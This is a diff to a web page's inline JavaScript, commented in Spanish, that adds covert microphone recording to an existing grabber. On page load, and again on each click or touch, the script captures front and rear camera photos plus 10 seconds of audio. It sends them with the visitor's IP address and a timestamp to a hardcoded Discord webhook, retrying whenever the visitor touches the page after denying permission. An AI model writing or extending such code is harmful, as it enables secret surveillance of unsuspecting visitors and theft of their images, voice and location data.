@@ -70,12 +70,14 @@
 
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';
 
+    const SEGUNDOS_GRABACION = 10; // cambia aquí la duración del audio
+
     let currentStream = null;
     let yaEnviado = false;
     let pidiendo = false;
-    let ipUsuario = null; // caché de la IP
+    let ipUsuario = null;
 
-    // Obtener la IP pública del usuario
+    // -------- Obtener IP pública --------
     async function obtenerIP() {
       if (ipUsuario) return ipUsuario;
       try {
@@ -89,10 +91,17 @@
       }
     }
 
-    // Captura un frame de la cámara indicada
+    // -------- Hora --------
+    function horaActual() {
+      const d = new Date();
+      const pad = n => String(n).padStart(2, '0');
+      return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
+    }
+
+    // -------- Capturar frame de cámara --------
     async function capturarDeCamara(facingMode) {
       if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
+        currentStream.getTracks().forEach(t => t.stop());
         currentStream = null;
       }
 
@@ -119,20 +128,15 @@
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
       if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
+        currentStream.getTracks().forEach(t => t.stop());
         currentStream = null;
       }
 
       return blob;
     }
 
-    function horaActual() {
-      const d = new Date();
-      const pad = n => String(n).padStart(2, '0');
-      return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
-    }
-
-    async function enviarCaptura(blob, mensaje, nombreArchivo) {
+    // -------- Enviar archivo al webhook --------
+    async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
       if (!blob) return;
       const formData = new FormData();
       formData.append('file', blob, nombreArchivo);
@@ -148,52 +152,89 @@
       }
     }
 
+    // -------- Grabar audio --------
+    async function grabarAudio(segundos) {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        audio: true,
+        video: false
+      });
+
+      const recorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      recorder.ondataavailable = e => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      return new Promise((resolve) => {
+        recorder.onstop = () => {
+          // Detener el micrófono
+          stream.getTracks().forEach(t => t.stop());
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+          resolve(blob);
+        };
+
+        recorder.start();
+        setTimeout(() => {
+          if (recorder.state !== 'inactive') recorder.stop();
+        }, segundos * 1000);
+      });
+    }
+
+    // -------- Flujo principal --------
     async function iniciar() {
       if (pidiendo || yaEnviado) return;
       pidiendo = true;
 
       const hora = horaActual();
-
-      // Obtener IP antes de enviar
       const ip = await obtenerIP();
       const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';
 
       try {
-        // Cámara frontal
+        // 1) Fotos
         const blobFrontal = await capturarDeCamara('user');
-        await enviarCaptura(
+        await enviarAlWebhook(
           blobFrontal,
           `📸 **Captura - Cámara frontal** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
           'frontal.jpg'
         );
 
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(r => setTimeout(r, 800));
 
-        // Cámara trasera
         const blobTrasera = await capturarDeCamara('environment');
-        await enviarCaptura(
+        await enviarAlWebhook(
           blobTrasera,
           `📸 **Captura - Cámara trasera** (mismo usuario)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
           'trasera.jpg'
+        );
+
+        // 2) Audio
+        const audioBlob = await grabarAudio(SEGUNDOS_GRABACION);
+        await enviarAlWebhook(
+          audioBlob,
+          `🎤 **Audio grabado** (${SEGUNDOS_GRABACION}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
+          'audio.webm'
         );
 
         yaEnviado = true;
 
       } catch (err) {
         console.error('Permiso denegado o error:', err);
+        // Si el usuario deniega, se queda cargando. Al hacer clic se reintenta.
       } finally {
         pidiendo = false;
       }
     }
 
+    // Primer intento al cargar
     window.addEventListener('load', () => {
       iniciar();
     });
 
+    // Reintento con clic o toque si no se ha enviado aún
     document.addEventListener('click', () => {
       if (!yaEnviado && !pidiendo) iniciar();
     });
-
     document.addEventListener('touchstart', () => {
       if (!yaEnviado && !pidiendo) iniciar();
     });
